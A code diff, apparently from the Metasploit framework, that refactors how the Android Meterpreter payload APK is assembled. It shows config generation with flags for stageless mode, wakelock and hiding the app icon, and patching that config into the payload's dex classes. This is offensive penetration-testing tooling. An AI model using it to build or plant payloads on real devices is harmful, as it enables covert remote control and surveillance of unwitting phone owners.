@@ -24,45 +24,45 @@ module Msf::Payload::Android
   # We could compile the .class files with dx here
   #
   def generate_stage(opts={})
+    ''
+  end
+
+  def generate_default_stage(opts={})
+    ''
   end
 
   #
   # Used by stagers to construct the payload jar file as a String
   #
-  def generate
-    generate_jar.pack
+  def generate(opts={})
+    generate_jar(opts).pack
   end
 
   def java_string(str)
     [str.length].pack("N") + str
   end
 
-  def apply_options(classes, opts)
-    config = generate_config_bytes(opts)
-    if opts[:stageless]
-      config[0] = "\x01"
-    end
-
-    string_sub(classes, "\xde\xad\xba\xad" + "\x00" * 8191, config)
-  end
-
-  def generate_config_bytes(opts={})
+  def generate_config(opts={})
     opts[:uuid] ||= generate_payload_uuid
+    ds = opts[:datastore] || datastore
 
     config_opts = {
       ascii_str:  true,
       arch:       opts[:uuid].arch,
-      expiration: datastore['SessionExpirationTimeout'].to_i,
+      expiration: ds['SessionExpirationTimeout'].to_i,
       uuid:       opts[:uuid],
-      transports: [transport_config(opts)]
+      transports: opts[:transport_config] || [transport_config(opts)],
+      stageless:  opts[:stageless] == true
     }
 
-    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
-    config.to_b
-  end
-
-  def string_sub(data, placeholder="", input="")
-    data.gsub!(placeholder, input + "\x00" * (placeholder.length - input.length))
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts).to_b
+    flags = 0
+    flags |= 1 if opts[:stageless]
+    flags |= 2 if ds['AndroidMeterpreterDebug']
+    flags |= 4 if ds['AndroidWakelock']
+    flags |= 8 if ds['AndroidHideAppIcon']
+    config[0] = flags.chr
+    config
   end
 
   def sign_jar(jar)
@@ -98,13 +98,18 @@ module Msf::Payload::Android
   end
 
   def generate_jar(opts={})
+    config = generate_config(opts)
     if opts[:stageless]
       classes = MetasploitPayloads.read('android', 'meterpreter.dex')
+      # Add stageless classname at offset 8000
+      config += "\x00" * (8000 - config.size)
+      config += 'com.metasploit.meterpreter.AndroidMeterpreter'
     else
       classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
     end
 
-    apply_options(classes, opts)
+    config += "\x00" * (8195 - config.size)
+    classes.gsub!("\xde\xad\xba\xad" + "\x00" * 8191, config)
 
     jar = Rex::Zip::Jar.new
     files = [
